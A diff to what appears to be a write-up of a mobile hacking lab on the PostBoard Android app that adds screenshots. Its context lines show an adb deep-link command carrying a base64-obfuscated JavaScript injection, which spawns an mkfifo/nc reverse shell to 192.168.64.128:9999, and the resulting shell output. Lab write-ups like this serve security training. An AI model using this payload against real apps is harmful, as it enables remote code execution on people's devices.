@@ -290,6 +290,7 @@ Verify:
 ```bash
 adb shell cat /data/data/com.mobilehackinglab.postboard/pwned.txt
 ```
+<img width="975" height="129" alt="image" src="https://github.com/user-attachments/assets/ea1d9c2a-3da5-42c4-ab17-dc7a3b9ac1ca" />
 
 Output:
 ```
@@ -366,6 +367,7 @@ adb shell am force-stop com.mobilehackinglab.postboard && \
 adb shell am start -a android.intent.action.VIEW \
   -d "postboard://postmessage/XCcpO1dlYkFwcEludGVyZmFjZS5wb3N0Q293c2F5TWVzc2FnZShgJChlY2hvIGNtMGdMV1lnTDJSaGRHRXZaR0YwWVM5amIyMHViVzlpYVd4bGFHRmphMmx1WjJ4aFlpNXdiM04wWW05aGNtUXZaanR0YTJacFptOGdMMlJoZEdFdlpHRjBZUzlqYjIwdWJXOWlhV3hsYUdGamEybHVaMnhoWWk1d2IzTjBZbTloY21Rdlpqc29ZMkYwSUM5a1lYUmhMMlJoZEdFdlkyOXRMbTF2WW1sc1pXaGhZMnRwYm1kc1lXSXVjRzl6ZEdKdllYSmtMMlo4TDNONWMzUmxiUzlpYVc0dmMyZ2dMV2tnTWo0bU1YeHVZeUF4T1RJdU1UWTRMalkwTGpFeU9DQTVPVGs1SUQ0dlpHRjBZUzlrWVhSaEwyTnZiUzV0YjJKcGJHVm9ZV05yYVc1bmJHRmlMbkJ2YzNSaWIyRnlaQzltS1NBbXxiYXNlNjQgLWR8c2ggJilgKS8v"
 ```
+<img width="975" height="184" alt="image" src="https://github.com/user-attachments/assets/49beb3b2-098d-4ede-ad09-22e5d7cfaa98" />
 
 The `&&` chaining ensures the force-stop completes before the start command runs. Terminal 1 receives the connection:
 
@@ -382,5 +384,6 @@ The TTY warning appears because there is no pseudo-terminal allocated — `mkfif
 :/ $ id
 uid=10213(u0_a213) gid=10213(u0_a213) groups=10213(u0_a213),3003(inet),9997(everybody),20213(u0_a213_cache),50213(all_a213) context=u:r:untrusted_app:s0:c213,c256,c512,c768
 ```
+<img width="975" height="172" alt="image" src="https://github.com/user-attachments/assets/129a91a0-719f-467d-9baf-7714d4ac5ae0" />
 
 ---
